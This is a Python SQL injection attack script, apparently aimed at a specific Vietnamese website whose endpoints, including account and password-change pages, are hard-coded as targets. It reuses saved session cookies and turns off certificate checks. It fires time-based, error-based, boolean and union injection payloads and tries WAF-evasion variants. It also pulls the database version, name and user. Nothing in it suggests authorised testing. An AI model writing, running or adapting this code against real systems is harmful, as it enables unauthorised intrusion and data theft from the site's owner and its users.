#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import time
import json
from urllib.parse import quote, urlencode
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

class SQLiExploit:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.vulnerabilities = []
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def time_based_test(self, url, param_name, payload):
        """时间盲注测试"""
        try:
            start = time.time()
            r = self.session.get(url, timeout=15)
            elapsed = time.time() - start
            
            # 测试延迟payload
            test_url = f"{url}&{param_name}={quote(payload)}" if '?' in url else f"{url}?{param_name}={quote(payload)}"
            start = time.time()
            r2 = self.session.get(test_url, timeout=15)
            elapsed2 = time.time() - start
            
            if elapsed2 - elapsed > 4:
                return True, elapsed2
        except:
            pass
        return False, 0
    
    def error_based_test(self, url, param_name, payload):
        """报错注入测试"""
        try:
            test_url = f"{url}&{param_name}={quote(payload)}" if '?' in url else f"{url}?{param_name}={quote(payload)}"
            r = self.session.get(test_url, timeout=10)
            
            error_indicators = [
                'sql syntax', 'mysql', 'postgresql', 'oracle',
                'microsoft ole db', 'odbc', 'sqlserver',
                'warning:', 'error in your sql',
                'quoted string', 'unclosed quotation',
                'sqlstate', 'exception', 'invalid query',
                'syntax error', 'parse error',
                'conversion failed', 'type mismatch',
                'invalid column', 'table doesn\'t exist',
                'column doesn\'t exist', 'unknown column'
            ]
            
            content_lower = r.text.lower()
            for indicator in error_indicators:
                if indicator in content_lower:
                    return True, r.text[:500]
        except:
            pass
        return False, None
    
    def boolean_based_test(self, url, param_name):
        """布尔盲注测试"""
        try:
            # True条件
            true_payload = "1' OR '1'='1"
            true_url = f"{url}&{param_name}={quote(true_payload)}" if '?' in url else f"{url}?{param_name}={quote(true_payload)}"
            r_true = self.session.get(true_url, timeout=10)
            
            # False条件
            false_payload = "1' AND '1'='2"
            false_url = f"{url}&{param_name}={quote(false_payload)}" if '?' in url else f"{url}?{param_name}={quote(false_payload)}"
            r_false = self.session.get(false_url, timeout=10)
            
            if len(r_true.content) != len(r_false.content):
                return True
        except:
            pass
        return False
    
    def union_based_test(self, url, param_name):
        """Union注入测试"""
        union_payloads = [
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "1' UNION SELECT 1--",
            "1' UNION SELECT 1,2--",
            "1' UNION SELECT 1,2,3--",
            "1' UNION SELECT 1,2,3,4--",
            "1' UNION SELECT 1,2,3,4,5--",
        ]
        
        for payload in union_payloads:
            try:
                test_url = f"{url}&{param_name}={quote(payload)}" if '?' in url else f"{url}?{param_name}={quote(payload)}"
                r = self.session.get(test_url, timeout=10)
                
                if r.status_code == 200 and 'union' not in r.text.lower():
                    return True, payload
            except:
                pass
        return False, None
    
    def test_endpoint_sqli(self, endpoint, params=None):
        """测试单个端点SQL注入"""
        print(f"[*] 测试: {endpoint}")
        
        url = f"{self.base_url}{endpoint}"
        if params:
            url += "?" + urlencode(params)
        
        # 提取参数名
        param_names = []
        if '?' in endpoint:
            query = endpoint.split('?')[1].split('&')[0]
            if '=' in query:
                param_names.append(query.split('=')[0])
        if params:
            param_names.extend(params.keys())
        
        if not param_names:
            param_names = ['id', 'q', 'search', 'keyword', 'name', 'user', 'user_id']
        
        results = {}
        
        for param_name in param_names:
            print(f"  [*] 参数: {param_name}")
            
            # 时间盲注payload
            time_payloads = [
                "1' AND SLEEP(5)--",
                "1' AND SLEEP(10)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' AND pg_sleep(5)--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--",
            ]
            
            # 报错注入payload
            error_payloads = [
                "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "1' AND updatexml(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1)--",
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--",
            ]
            
            # 测试时间盲注
            for payload in time_payloads[:3]:
                is_vuln, delay = self.time_based_test(url, param_name, payload)
                if is_vuln:
                    print(f"    [!] 时间盲注: {delay:.2f}s")
                    results[f'{param_name}_time'] = {
                        'type': 'Time-based SQL Injection',
                        'payload': payload,
                        'delay': delay
                    }
                    self.vulnerabilities.append({
                        'endpoint': endpoint,
                        'param': param_name,
                        'type': 'Time-based SQL Injection',
                        'payload': payload,
                        'delay': delay
                    })
                    break
            
            # 测试报错注入
            for payload in error_payloads[:3]:
                is_vuln, error_msg = self.error_based_test(url, param_name, payload)
                if is_vuln:
                    print(f"    [!] 报错注入")
                    print(f"        错误信息: {error_msg[:200]}")
                    results[f'{param_name}_error'] = {
                        'type': 'Error-based SQL Injection',
                        'payload': payload,
                        'error': error_msg[:500]
                    }
                    self.vulnerabilities.append({
                        'endpoint': endpoint,
                        'param': param_name,
                        'type': 'Error-based SQL Injection',
                        'payload': payload,
                        'error': error_msg[:500]
                    })
                    break
            
            # 测试布尔盲注
            if self.boolean_based_test(url, param_name):
                print(f"    [!] 布尔盲注")
                results[f'{param_name}_boolean'] = {
                    'type': 'Boolean-based SQL Injection'
                }
                self.vulnerabilities.append({
                    'endpoint': endpoint,
                    'param': param_name,
                    'type': 'Boolean-based SQL Injection'
                })
            
            # 测试Union注入
            is_union, payload = self.union_based_test(url, param_name)
            if is_union:
                print(f"    [!] Union注入")
                results[f'{param_name}_union'] = {
                    'type': 'Union-based SQL Injection',
                    'payload': payload
                }
                self.vulnerabilities.append({
                    'endpoint': endpoint,
                    'param': param_name,
                    'type': 'Union-based SQL Injection',
                    'payload': payload
                })
        
        return results
    
    def extract_db_info(self, endpoint, param_name):
        """提取数据库信息"""
        print(f"[*] 提取数据库信息: {endpoint}")
        
        url = f"{self.base_url}{endpoint}"
        
        # 提取版本
        version_payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' UNION SELECT NULL,NULL,version(),NULL--",
        ]
        
        # 提取数据库名
        db_payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' UNION SELECT NULL,NULL,database(),NULL--",
        ]
        
        # 提取用户
        user_payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' UNION SELECT NULL,NULL,user(),NULL--",
        ]
        
        for payload in version_payloads:
            test_url = f"{url}?{param_name}={quote(payload)}"
            try:
                r = self.session.get(test_url, timeout=10)
                if 'version' in r.text.lower() or 'microsoft' in r.text.lower() or 'mysql' in r.text.lower():
                    # 提取版本号
                    import re
                    version_match = re.search(r'(\d+\.\d+\.\d+)', r.text)
                    if version_match:
                        self.db_info['version'] = version_match.group(1)
                        print(f"    [+] 数据库版本: {self.db_info['version']}")
                        break
            except:
                pass
    
    def test_all_endpoints(self):
        """测试所有端点"""
        endpoints = [
            ("/Handle/SearchListCustomer", {"q": "test", "search": "test", "keyword": "test"}),
            ("/Handle/SearchListProvince", {"Type": "test"}),
            ("/Handle/SearchListWardByDistrictID", {"DistrictID": "1"}),
            ("/Handle/SearchListDistrictByProvinceID", {"ProvinceID": "1"}),
            ("/Handle/SearchListWareHouse", {}),
            ("/Handle/SearchListProductVariantByWareHouseID", {"WareHouseID": "1"}),
            ("/Handle/SearchListFunctionalByGroupPermissionID", {"GroupPermissionID": "1"}),
            ("/Handle/SearchPWDByVNPMapsSearch", {"q": "test"}),
            ("/Handle/SearchPWDByEMSMapsSearch", {"q": "test"}),
            ("/Handle/SearchPWDByVMapCode", {"code": "test"}),
            ("/Handle/VNPMapsAutocomplete", {"q": "test"}),
            ("/Account/GetUserInfo", {"id": "1", "ID": "1", "Id": "1"}),
            ("/Account/ChangePassword", {}),
            ("/Account/Profile", {}),
        ]
        
        for endpoint, params in endpoints:
            try:
                self.test_endpoint_sqli(endpoint, params)
                time.sleep(1)  # 避免请求过快
            except Exception as e:
                print(f"[-] Error testing {endpoint}: {e}")
    
    def waf_bypass_test(self, endpoint, param_name):
        """WAF绕过测试"""
        print(f"[*] WAF绕过测试: {endpoint}")
        
        url = f"{self.base_url}{endpoint}"
        
        # 绕过技术
        bypass_payloads = [
            # 注释绕过
            "1'/**/OR/**/'1'='1",
            "1'/*comment*/OR/*comment*/'1'='1",
            "1'--%0AOR--%0A'1'='1",
            "1'#%0AOR#%0A'1'='1",
            
            # 大小写绕过
            "1' Or '1'='1",
            "1' OR '1'='1",
            "1' oR '1'='1",
            "1' oR '1'='1",
            
            # 编码绕过
            "1%27%20OR%20%271%27%3D%271",
            "1'%20OR%20'1'='1",
            "%31%27%20%4F%52%20%27%31%27%3D%27%31",
            
            # 双重编码
            "%31%2527%2520%254F%2552%2520%2527%2531%2527%253D%2527%2531",
            
            # 空格绕过
            "1'/**/OR/**/'1'='1",
            "1'%09OR%09'1'='1",
            "1'%0AOR%0A'1'='1",
            "1'%0DOR%0D'1'='1",
            "1'%0COR%0C'1'='1",
            "1'%0BOR%0B'1'='1",
            
            # 函数绕过
            "1' OR CHAR(49)=CHAR(49)",
            "1' OR ASCII('1')=49",
            "1' OR UNICODE('1')=49",
            
            # 时间盲注绕过
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--",
        ]
        
        for payload in bypass_payloads:
            test_url = f"{url}?{param_name}={payload}"
            try:
                start = time.time()
                r = self.session.get(test_url, timeout=15)
                elapsed = time.time() - start
                
                if elapsed > 4:
                    print(f"    [!] WAF绕过成功: {payload[:50]}")
                    return True, payload
            except:
                pass
        
        return False, None
    
    def save_results(self):
        """保存结果"""
        with open('sqli_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'vulnerabilities': self.vulnerabilities,
                'db_info': self.db_info
            }, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 发现 {len(self.vulnerabilities)} 个SQL注入漏洞")
        if self.vulnerabilities:
            print("\n漏洞列表:")
            for vuln in self.vulnerabilities:
                print(f"  - {vuln['endpoint']} [{vuln['param']}] - {vuln['type']}")
    
    def run_all(self):
        """执行所有测试"""
        print("[*] 开始SQL注入深度测试...\n")
        self.test_all_endpoints()
        self.save_results()

if __name__ == "__main__":
    sqli = SQLiExploit()
    sqli.run_all()